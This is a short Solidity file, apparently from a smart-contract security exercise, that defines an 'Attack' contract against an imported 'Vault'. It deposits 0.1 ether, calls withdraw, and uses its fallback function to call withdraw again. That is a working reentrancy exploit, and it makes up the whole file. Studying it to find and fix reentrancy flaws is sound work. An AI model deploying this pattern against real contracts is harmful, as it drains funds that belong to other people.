// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
contract Attack{

    Vault public vault;

    constructor(Vault _vault)payable{
        vault = _vault;
    }


    fallback() external payable {
        vault.withdraw();
    }

    function attack() public {
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
    }

    
}